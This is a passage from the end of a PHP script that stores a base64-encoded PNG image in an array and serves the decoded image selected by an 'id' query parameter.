            "Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhM".
            "WE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQ".
            "AkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+Io".
            "UspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdp".
            "r+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNzHrmOeZ".
            "D5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp1Q61Mb".
            "U2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2Xx2KruY".
            "/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqpaXllir".
            "SKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6UbobtEd79u".
            "p+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXcNAQ6Vh".
            "lWGX4YSRudE8o9VGjUYPjGnGXOMk423GbcajJgYmISZLTepN7ppSTbmmKaY7TDtMx83MzaLN1pk1".
            "mz0x1zLnm+eb15vft2BaeFostqi2uGVJsuRaplnutrxuhVo5WaVYVVpds0atna0l1rutu6cRp7lO".
            "k06rntZnw7Dxtsm2qbcZsOXYBtuutm22fWFnYhdnt8Wuw+6TvZN9un2N/T0HDYfZDqsdWh1+c7Ry".
            "FDpWOt6azpzuP33F9JbpL2dYzxDP2DPjthPLKcRpnVOb00dnF2e5c4PziIuJS4LLLpc+Lpsbxt3I".
            "veRKdPVxXeF60vWdm7Obwu2o26/uNu5p7ofcn8w0nymeWTNz0MPIQ+BR5dE/C5+VMGvfrH5PQ0+B".
            "Z7XnIy9jL5FXrdewt6V3qvdh7xc+9j5yn+M+4zw33jLeWV/MN8C3yLfLT8Nvnl+F30N/I/9k/3r/".
            "0QCngCUBZwOJgUGBWwL7+Hp8Ib+OPzrbZfay2e1BjKC5QRVBj4KtguXBrSFoyOyQrSH355jOkc5p".
            "DoVQfujW0Adh5mGLw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNSo+qi5q".
            "PNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpxapLhIs".
            "OpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5".
            "hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQ".
            "rAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9".
            "rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1d".
            "T1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aX".
            "Dm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7".
            "vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3S".
            "PVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKa".
            "RptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO".
            "32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21".
            "e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfV".
            "P1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i".
            "/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo98PT+R8".
            "IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADq".
            "YAAAOpgAABdvkl/FRgAACadJREFUeNrEV1lsXOUV/s6/3Dt3xh6PY8e7HTskcQKEBMoiFtGyqRSk".
            "IJVS0RZEVRBSVRUeEIK+tVJVnlAfqJAQtCCWtkIqlAISkAJVwhYSkkZgBZI4ToLtOInt8SyemXv/".
            "5fRhZpyBUvrIlY7+uZqZ831nPz8xM77JR+Abfmjd937d8spgCmAdAQJQBORlNkybysU+ay8JjFyj".
            "LHUSkYTnSo3C0+ziKWlqezMeE+VIVshLOA9o4UEgAAwnPMgpMDGY+XxB1E6gHUdefQDqfzHzzq9y".
            "St3dF+EnqVWrzk6HKRFEIbRWUEpCCoKEg7MO1WrNloqlaVsovlleTl7yTNuVRo2IvqDTWrc+Sum/".
            "O+cfZvY7AEAR+Rb7ATDDA9dkO9r+sLqvdyNJDecYIIIDgR1gmSElQUmNIJVGd0enGhwZGk0pvrNU".
            "LNx59PjcxPGZ+SeMMc8GWs4DQDU2Y+dtHHj5kvNGR579x665Zu4pZ9Jn4iEMPNx1Pb19LwwND7ZV".
            "ahbL1RhKSWgloaQECaoTBcF5RmwsjHXQiURHW4jBoUFs2TR6TrFQ/P2e/YfvnTg081Aljt/bMNz/".
            "3D13XDt+fHoeznkhRN076sj2B1YIZNfu6B+7fNcTo6MjbdXEIo5jwCYwiWUDTyAgHaY4SkeUyUSQ".
            "OoBxQGIcQi2hBKEWJ8hLRl9PF+64ZXD00JHpxz76+Fj8/eu/FeowRLmaoLXuVMf691deolWzvxwZ".
            "GhvxzFg4PY/KcmU2DMNPpVbz3uoZqtHrnx4/7AMVnh0E+oJVq9qvGezpGRzs64IONKzzCLRESksk".
            "zmJxuYb164ax9ZyxsJJY5Eu1OjjBopEeKnfh2wAA51ymJ8rdGgbrMTV13IHE20Ojw7szUaq6XKnp".
            "5bJ7viPIfTKzNAlmbK/FCaanT+Yml07e2Pd59mfnr1t79aaNQyCl4HzdI5IEissJylUDAUIqFcB7".
            "BgFupQ9QQaIhm9vTnaOzs3MIwvCVjeNnvbU6l11uiwIbx6ZYTpIjJ/gUAp0CwCAiaKGWTI6eWyiW".
            "rnll375tL25/f0+1UMCaviwCLQECpCAoQfBgxMbDef5CCAQRQARorc5ZXq5SHJsPN2xY+1oUBQtR".
            "qKcDHczExi4QTAyy6OjshpASaGQxMSOAgOuml4/N56986vmdv3rjzX2ljpSEEgLNSkwsI7Ye/ms6".
            "YffSUgEjw/3P59rSx6JAfx5F4bFUKKeZsMDEHgJQ6TSk0lgxgwWWVYSwJBGxrFbi5PGp6dOLUhCE".
            "IAgiWAfEiUds3QrxlSRsKrLOZdvbUxNDA6t3BFpYsEpIiJoiuECpVM04MAOl+ZNIahUoknBEKJTX".
            "wCmBkfIR2KrpHBvueunuH1+1JvYE7z1AhGriUDUOCgRfd4FDIwtVMyLWWhoZHnhnoKt3IqYk7OoS".
            "SZtUyeT+BStMQsyGywt5xJUKBIlG2xLwrAAwLLvU8EDu2Xt+eu3l7R1tKFUSZDMKNeNhPCFwQBAG".
            "iJUAmG3TE4qaTKT8zUJ+yeza+7G3bCtdqxlJoYp3P/ocUhI778CeIaVoDZ8XcGDmDEE+s3nj4A1L".
            "hQpOnFqCFARmwHmGdVxPvkBj8uhJgGklOWjshoeaCs8jwv1ELACCdwBJQhioZsmCiMCArFSTqmQ8".
            "AMKpREgA6Faef0jEpcRaZ71BSqUQhBreMaAIwjMzQMa6CjPeBXD66KsP1ENQZ+pGr7/qgtvGN6yB".
            "cw5RIBEFAqGSaP5Ga8JLb+zFBx9N3qUEzQMEyQ4A5hn0qHUWkUrj/MFvo69X4/KbhvDv3XNQ42m0".
            "Ly7D1gjb3/3g4oOHZzu1VqfrSXjGPqe04qqTRExICQlSCpCA90AmUtj5wQQ+2HvkF1LSH8HUGGCN".
            "/zMDBIz0r0dHLks1VWhbWqo5nREBzZXDoqPAGEML+fLvhKC/AHywToBW6kkTM2lZD66WgKJ6/AIt".
            "sGf/YfvCmxO/BclHA+lAxDC+Tp8ZEFKgq2s1SqqA3Qs7ZIfJbskcprzWQpqqTREJubhYHCiVqhcI".
            "QU+eKcOW5URKgZSWECCEStYzTQgs5Yt48bW9B4uceqg9cJBUBiTAiQB5BjGglIQKI4AJUoQSHmcZ".
            "a09ZA2nZpUhIP3VsZpvWqtMkXGtW3xdWMiEIgRIIFUEKwDHDWId0Jo2bb7hww7qse11Ui5c6Blr7".
            "KRGhWi6gXJxHkNMQESklZC5OzPByYtYkxg/MzM1vXVwqbMt1drD1bqYZObGyihCgpEAqIGgp4JnB".
            "nuE9o2YZa9YMqB9su+I7W89d9zZBPWqM39S60AqpUJyfwtw+AyqmV4eh6IwT21eLk85T8/mBQweP".
            "3NrbszoH5nnF/Jn0DQ8IHYFIAiBoSQilAAlASgHfMNRYh3yxitgLbNkyHl552YU/H+wf/jBQ+hnn".
            "/TbnXGd9jSvj9BQgOLuZJOnT+UJ49Nj0xkOHpm7v7u5an81msFQo/dOrIO/DTD0H8gdeQ2boQlCQ".
            "1ZIAKQkRCeSLFbS1RagmDnHiEBuPSs2gXLNgFWJk7Vhbd0/vbfn80m3FQvFkuVzcB+79rGt8Klw2".
            "5c3VKZcyzvdLKQd6+/vQ253Didk5rpQLTxA7FA7vAXAPVP6z11GY2onOc28RSl+BjrYAO3Ydxl//".
            "tn3n1i3jmy67ZHN3ECiUKhax8UgSh3LVoBZbgCQ6urrRluvstSa5Pknc9UmSwFoDkEQkBMJAI5dN".
            "o7xcw/HJA0/N7njkLXgDb+MzVeCTCuKFSZXJpLH/wAk89aenn57b8+f7j3/Yc+6+PTfdu/WiS787".
            "tnYkVFKCycG6emPy3sP7xoxnglASWqQgnYZzHkRAlApRqSSYnNj7xondzz7ok7IG4NFYSgiABOA6".
            "119913U/uu/xPe+8/vyRfz12H3ysGt8plTvr/O71l988vPGib3f3j6yO0pn6vu8YznkYb+Gth/Me".
            "3jOc93DOQwqJ8tJ8aWZi55OLB1592FYXlxqYCYCEmd0KgVWbbnww1bP52rn3Hrndm2UBoA2AbggA".
            "SOhsf6Zv08XtfeNbO/s3nBt1dPUFqbZAKCUACescrDGc1Mpxtbh4rDT7yVuF47tfihcm9zWHVwPc".
            "AIiZ2VKDEVKrxsadqZZNaa4MINMC3hTZUOIAKAidlalcLuwY7Bc6ahdSRcwcszOLpjQ3lZROzLJL".
            "Tjf0UwPUNK0HYJmZ6Ss2pFQLqGqIbJyi8ZkaFdqMZevZunV5ALYB3Hr6+vhYmSRfeWltgskW65uy".
            "4rkvgbWKa5EvE8P/I/CFC2zLSS0E/ktfA6S1UX/t3Z+Z8Z8BAEzz4aamHZMBAAAAAElFTkSuQmCC"
            );
            echo base64_decode($image[$_GET['id']]);
           }
    }
?>
